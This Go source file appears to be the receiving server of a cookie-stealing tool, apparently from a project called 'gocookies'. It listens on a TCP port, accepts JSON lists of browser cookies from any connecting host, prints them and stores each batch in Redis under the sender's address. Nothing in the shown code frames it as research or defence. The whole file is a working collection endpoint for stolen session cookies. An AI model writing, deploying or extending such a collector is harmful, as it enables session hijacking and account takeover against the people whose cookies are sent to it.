package main

import (
	"encoding/json"
	"fmt"
	"github.com/simonfalke-01/gocookies/listener/redis"
	"log"
	"net"
)

func setupListener(port int) (net.Listener, error) {
	listener, err := net.Listen("tcp", fmt.Sprintf(":%v", port))
	if err != nil {
		return nil, err
	}

	return listener, nil
}

func startListener(listener net.Listener, c *redis.Client) {
	for {
		conn, err := listener.Accept()
		if err != nil {
			continue
		}

		go func() {
			defer recoverFromPanic()

			handleConnection(conn, c)
		}()
	}
}

func handleConnection(conn net.Conn, c *redis.Client) {
	defer func(conn net.Conn) {
		err := conn.Close()
		if err != nil {
			log.Printf("[*] Error closing connection: %v", err)
		}
	}(conn)

	data := readAll(conn)
	dataStr := data
	// unmarshal json bytes to cookies
	err := json.Unmarshal(data, &[]jsonCookie{})
	if err != nil {
		log.Fatalf("[*] Error unmarshalling json bytes: %v", err)
	}

	fmt.Println(string(dataStr))

	// store in redis
	err = c.Set(fmt.Sprintf("%v", conn.RemoteAddr()), dataStr)
	if err != nil {
		log.Fatalf("[*] Error setting cookie in redis: %v", err)
	}
}

func readAll(conn net.Conn) []byte {
	var data []byte
	var buf [1024]byte

	for {
		length, err := conn.Read(buf[0:])
		if err != nil {
			break
		}

		data = append(data, buf[0:length]...)

		if length == 0 {
			break
		}
	}

	return data
}